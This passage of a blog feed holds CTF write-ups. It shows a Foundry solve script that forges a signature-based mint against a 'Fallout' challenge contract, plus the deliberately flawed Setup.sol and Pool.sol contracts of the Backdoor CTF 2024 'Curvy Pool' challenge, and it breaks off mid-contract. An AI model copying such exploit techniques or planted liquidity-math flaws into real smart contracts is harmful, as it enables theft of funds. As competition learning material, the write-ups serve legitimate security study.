    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;Fallout.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract FalloutSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Fallout public fallout = Fallout(0xf96C8C1685180b9551f86952992baAA220E7C91C);
&lt;&#x2F;span&gt;&lt;span&gt;    Vault public vault = fallout.vault();
&lt;&#x2F;span&gt;&lt;span&gt;    address player = vm.envAddress(&amp;quot;PLAYER&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    function run() external{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Fallout : &amp;quot;, address(fallout));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Vault : &amp;quot;, address(vault));
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 qx = fallout.Qx();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 qy = fallout.Qy();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256  a = vault.a();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256  b = vault.b();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256  gx = vault.gx();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256  gy = vault.gy();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256  p = vault.p();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 n = 4007911249843509079694969957202343357280666055654537667969; &#x2F;&#x2F; n = Ep.order()
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Qx = &amp;quot;, qx);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Qy = &amp;quot;, qy);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;a = &amp;quot;, a);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;b = &amp;quot;, b);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;gx = &amp;quot;, gx);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;gy = &amp;quot;, gy);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;p = &amp;quot;, p);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;n = &amp;quot;, n);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved() : &amp;quot;, fallout.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 hash = keccak256(abi.encode(player, 1_000_000 ether));
&lt;&#x2F;span&gt;&lt;span&gt;        console.logBytes32(hash);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[2] memory rs = [uint256(2195097151127120065579326181785367043581509779126357541128), 928540552076520879873320608471470817377985074596666122262];
&lt;&#x2F;span&gt;&lt;span&gt;        fallout.mint(player, 1_000_000 ether, rs);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;isSolved() : &amp;quot;, fallout.isSolved());   
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;chef&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#chef&quot; aria-label=&quot;Anchor link for: chef&quot;&gt;Chef&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;I learned Huff programming just to solve this challenge. This challenge deserves a dedicated blog, read it here : &lt;a href=&quot;https:&#x2F;&#x2F;themj0ln1r.github.io&#x2F;posts&#x2F;learn-huff-with-ctf&quot;&gt;Learn Huff by solving a CTF challenge&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Kudos to you for sticking with me till the end and hope you&#x27;ve learned something from this.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;References&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blog.trailofbits.com&#x2F;2018&#x2F;09&#x2F;05&#x2F;contract-upgrade-anti-patterns&#x2F;&quot;&gt;Anti Proxy Patterns&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.cyfrin.io&#x2F;blog&#x2F;price-oracle-manipulation-attacks-with-examples&quot;&gt;Oracle Manipulation&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;mixbytes.io&#x2F;blog&#x2F;uniswap-v3-ticks-dive-into-concentrated-liquidity&quot;&gt;Uniswap V3 Concentrated Liquidity&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;rdi.berkeley.edu&#x2F;berkeley-defi&#x2F;assets&#x2F;material&#x2F;COMPRESSED%20Oracle%20Lecture%E2%80%94DeFi%20course.pdf&quot;&gt;Oracles&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;rdi.berkeley.edu&#x2F;berkeley-defi&#x2F;assets&#x2F;material&#x2F;Lecture%207%20Introduction%20Slides.pdf&quot;&gt;Stable Coins&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.curve.fi&#x2F;stableswap-exchange&#x2F;stableswap-ng&#x2F;pools&#x2F;metapool&#x2F;#remove_liquidity&quot;&gt;CurveStableSwapNG Metapool Docs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;cryptobook.nakov.com&#x2F;asymmetric-key-ciphers&#x2F;elliptic-curve-cryptography-ecc&quot;&gt;Elliptic Curve For Developers&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blog.trailofbits.com&#x2F;2020&#x2F;06&#x2F;11&#x2F;ecdsa-handle-with-care&#x2F;&quot;&gt;ECDSA Handle with care&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.monnerat.info&#x2F;publications&#x2F;anomalous.pdf&quot;&gt;Generating Anomalous Elliptic Curves&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Backdoor CTF 2024</title>
        <published>2024-12-23T00:00:00+00:00</published>
        <updated>2024-12-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/backdoorctf24/"/>
        <id>https://themj0ln1r.github.io/writeups/backdoorctf24/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/backdoorctf24/">&lt;p&gt;Back to CTF&#x27;s to be sharper in problem solving. I played &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2540&quot; target=_blank&gt;Backdoor CTF 2023&lt;&#x2F;a&gt; with our amazing team &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;364723&quot; target=_blank&gt;Infobahn&lt;&#x2F;a&gt;. We got &lt;strong&gt;&lt;code&gt;4th&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; place in this CTF. I solved few Blockchain challs as usual. Solutions,&lt;&#x2F;p&gt;
&lt;h1 id=&quot;curvy-pool&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#curvy-pool&quot; aria-label=&quot;Anchor link for: curvy-pool&quot;&gt;Curvy Pool&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;No description required, &lt;code&gt;isSolved()&lt;&#x2F;code&gt; is the problem statement for us (most of the time).&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Setup.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;soliidty&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-soliidty &quot;&gt;&lt;code class=&quot;language-soliidty&quot; data-lang=&quot;soliidty&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.16;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import {ERC20} from &amp;quot;.&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Pool} from &amp;quot;.&#x2F;Pool.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Dummy WETH Token
&lt;&#x2F;span&gt;&lt;span&gt;contract DummyWETH is ERC20 {
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(uint256 supply) ERC20(&amp;quot;Dummy WETH&amp;quot;, &amp;quot;WETH-D&amp;quot;) {
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(msg.sender, supply);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Dummy PUFETH Token
&lt;&#x2F;span&gt;&lt;span&gt;contract DummyPUFETH is ERC20 {
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(uint256 supply) ERC20(&amp;quot;Dummy PUFETH&amp;quot;, &amp;quot;PUFETH-D&amp;quot;) {
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(msg.sender, supply);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Deployment Script
&lt;&#x2F;span&gt;&lt;span&gt;contract Setup {
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; bool) public hasClaimedWETH;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; bool) public hasClaimedPUFETH;
&lt;&#x2F;span&gt;&lt;span&gt;    DummyWETH private wethToken = new DummyWETH(11 ether);
&lt;&#x2F;span&gt;&lt;span&gt;    DummyPUFETH private pufethToken= new DummyPUFETH(11 ether);
&lt;&#x2F;span&gt;&lt;span&gt;    Pool public immutable pool = new Pool(address(wethToken), address(pufethToken), 0);
&lt;&#x2F;span&gt;&lt;span&gt;    constructor() payable{
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Deploy Dummy Tokens
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;         &#x2F;&#x2F; Deploy Pool
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Approve and add liquidity
&lt;&#x2F;span&gt;&lt;span&gt;        wethToken.approve(address(pool), 10 ether);
&lt;&#x2F;span&gt;&lt;span&gt;        pufethToken.approve(address(pool), 10 ether);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        pool.addLiquidity(10 ether, 10 ether);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Log addresses for reference
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;WETH-D Token:&amp;quot;, address(wethToken));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;PUFETH-D Token:&amp;quot;, address(pufethToken));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;Pool:&amp;quot;, address(pool));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function claimWETH() external {
&lt;&#x2F;span&gt;&lt;span&gt;        require(!hasClaimedWETH[msg.sender], &amp;quot;Already claimed WETH&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        hasClaimedWETH[msg.sender] = true;
&lt;&#x2F;span&gt;&lt;span&gt;        wethToken.transfer(msg.sender,1 ether);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function claimPUFETH() external {
&lt;&#x2F;span&gt;&lt;span&gt;        require(!hasClaimedPUFETH[msg.sender], &amp;quot;Already claimed PUFETH&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        hasClaimedPUFETH[msg.sender] = true;
&lt;&#x2F;span&gt;&lt;span&gt;        pufethToken.transfer(msg.sender,1 ether);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved(address user) public view returns(bool){
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 sharesHeldByPoolOwner = pool.balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 sharesToWin = sharesHeldByPoolOwner&#x2F;2;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 sharesHeldBySender = pool.balanceOf(user);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        return sharesHeldBySender &amp;gt; sharesToWin;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Pool.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;soliidty&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-soliidty &quot;&gt;&lt;code class=&quot;language-soliidty&quot; data-lang=&quot;soliidty&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.16;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;.&#x2F;IERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;.&#x2F;LiquidityToken.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;error Pool__InvalidTokenRatio();
&lt;&#x2F;span&gt;&lt;span&gt;error Pool__ZeroLiquidityToken();
&lt;&#x2F;span&gt;&lt;span&gt;error Pool__InvalidToken();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Pool is LiquidityToken {
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 private immutable i_token0;
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 private immutable i_token1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private s_reserve0;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 private s_reserve1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint8 private immutable i_fee;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event AddedLiquidity(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed liquidityToken,
&lt;&#x2F;span&gt;&lt;span&gt;        address token0,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed amount0,
&lt;&#x2F;span&gt;&lt;span&gt;        address token1,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed amount1
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event RemovedLiquidity(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed liquidityToken,
&lt;&#x2F;span&gt;&lt;span&gt;        address token0,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed amount0,
&lt;&#x2F;span&gt;&lt;span&gt;        address token1,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed amount1
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event Swapped(
&lt;&#x2F;span&gt;&lt;span&gt;        address tokenIn,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed amountIn,
&lt;&#x2F;span&gt;&lt;span&gt;        address tokenOut,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed amountOut
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(
&lt;&#x2F;span&gt;&lt;span&gt;        address token0,
&lt;&#x2F;span&gt;&lt;span&gt;        address token1,
&lt;&#x2F;span&gt;&lt;span&gt;        uint8 fee
&lt;&#x2F;span&gt;&lt;span&gt;    ) LiquidityToken(&amp;quot;Backdoor Token&amp;quot;, &amp;quot;BT&amp;quot;) {
&lt;&#x2F;span&gt;&lt;span&gt;        i_token0 = IERC20(token0);
&lt;&#x2F;span&gt;&lt;span&gt;        i_token1 = IERC20(token1);
&lt;&#x2F;span&gt;&lt;span&gt;        i_fee = fee;
&lt;&#x2F;span&gt;&lt;span&gt;        s_reserve0 = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        s_reserve1 = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        i_token0.approve(address(this), type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;        i_token1.approve(address(this), type(uint256).max);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _updateLiquidity(uint256 reserve0, uint256 reserve1) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        s_reserve0 = reserve0;
&lt;&#x2F;span&gt;&lt;span&gt;        s_reserve1 = reserve1;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function swap(address _tokenIn, uint256 amountIn) external {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Objective: To Find amount of Token Out
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 amountOut, uint256 resIn, uint256 resOut, bool isToken0) = getAmountOut(_tokenIn, amountIn);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token0 = i_token0; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token1 = i_token1; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 res0, uint256 res1, IERC20 tokenIn, IERC20 tokenOut) = isToken0
&lt;&#x2F;span&gt;&lt;span&gt;            ? (resIn + amountIn, resOut - amountOut, token0, token1)
&lt;&#x2F;span&gt;&lt;span&gt;            : (resOut - amountOut, resIn + amountIn, token1, token0);
&lt;&#x2F;span&gt;&lt;span&gt;        bool success = tokenIn.transferFrom(msg.sender, address(this), amountIn);
&lt;&#x2F;span&gt;&lt;span&gt;        require(success, &amp;quot;Swap Failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _updateLiquidity(res0, res1);
&lt;&#x2F;span&gt;&lt;span&gt;        tokenOut.transfer(msg.sender, amountOut);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        emit Swapped(address(tokenIn), amountIn, address(tokenOut), amountOut);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function addLiquidity(uint256 amount0, uint256 amount1) external {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 reserve0 = s_reserve0; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 reserve1 = s_reserve1; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount0 &amp;lt; 0 || amount1 &amp;lt; 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            revert Pool__InvalidTokenRatio();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token0 = i_token0; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token1 = i_token1; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        token0.transferFrom(msg.sender, address(this), amount0);
&lt;&#x2F;span&gt;&lt;span&gt;        token1.transferFrom(msg.sender, address(this), amount1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 liquidityTokens = ((amount0*amount0) + (amount1*amount1))&#x2F;(1 ether);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (liquidityTokens == 0) revert Pool__ZeroLiquidityToken();
&lt;&#x2F;span&gt;&lt;span&gt;        _mint(msg.sender, liquidityTokens);
&lt;&#x2F;span&gt;&lt;span&gt;        _updateLiquidity(reserve0 + amount0, reserve1 + amount1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        emit AddedLiquidity(
&lt;&#x2F;span&gt;&lt;span&gt;            liquidityTokens,
&lt;&#x2F;span&gt;&lt;span&gt;            address(token0),
&lt;&#x2F;span&gt;&lt;span&gt;            amount0,
&lt;&#x2F;span&gt;&lt;span&gt;            address(token1),
&lt;&#x2F;span&gt;&lt;span&gt;            amount1
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function removeLiquidity(uint256 liquidityTokens) external {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 amount0, uint256 amount1) = getAmountsOnRemovingLiquidity(liquidityTokens);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        _burn(msg.sender, liquidityTokens);
&lt;&#x2F;span&gt;&lt;span&gt;        _updateLiquidity(s_reserve0 - amount0, s_reserve1 - amount1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token0 = i_token0; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token1 = i_token1; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        token0.transfer(msg.sender, amount0);
&lt;&#x2F;span&gt;&lt;span&gt;        token1.transfer(msg.sender, amount1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        emit RemovedLiquidity(
&lt;&#x2F;span&gt;&lt;span&gt;            liquidityTokens,
&lt;&#x2F;span&gt;&lt;span&gt;            address(token0),
&lt;&#x2F;span&gt;&lt;span&gt;            amount0,
&lt;&#x2F;span&gt;&lt;span&gt;            address(token1),
&lt;&#x2F;span&gt;&lt;span&gt;            amount1
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getAmountsOnRemovingLiquidity(uint256 liquidityTokens) public view returns(uint256 amount0, uint256 amount1){
&lt;&#x2F;span&gt;&lt;span&gt;        require(liquidityTokens &amp;gt; 0, &amp;quot;0 Liquidity Tokens&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        amount0 = liquidityTokens&#x2F;2;
&lt;&#x2F;span&gt;&lt;span&gt;        amount1 = liquidityTokens&#x2F;2;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getAmountOut(
&lt;&#x2F;span&gt;&lt;span&gt;        address _tokenIn,
&lt;&#x2F;span&gt;&lt;span&gt;        uint amountIn
&lt;&#x2F;span&gt;&lt;span&gt;    ) public view returns (uint, uint , uint , bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        require(
&lt;&#x2F;span&gt;&lt;span&gt;            _tokenIn == address(i_token0) || _tokenIn == address(i_token1),
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;quot;Invalid Token&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        bool isToken0 = _tokenIn == address(i_token0) ? true : false;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 reserve0 = s_reserve0; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 reserve1 = s_reserve1; &#x2F;&#x2F; gas optimization
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 resIn,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 resOut
&lt;&#x2F;span&gt;&lt;span&gt;        ) = isToken0
&lt;&#x2F;span&gt;&lt;span&gt;                ? (reserve0, reserve1)
&lt;&#x2F;span&gt;&lt;span&gt;                : (reserve1, reserve0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amountInWithFee = (amountIn * (10000 - i_fee)) &#x2F; 10000;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amountOut = amountInWithFee;
&lt;&#x2F;span&gt;&lt;span&gt;        return (amountOut, resIn, resOut, isToken0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getReserves() public view returns (uint256, uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return (s_reserve0, s_reserve1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getTokens() public view returns (address, address) {
&lt;&#x2F;span&gt;&lt;span&gt;        return (address(i_token0), address(i_token1));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getFee() external view returns (uint8) {
&lt;&#x2F;span&gt;&lt;span&gt;        return i_fee;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
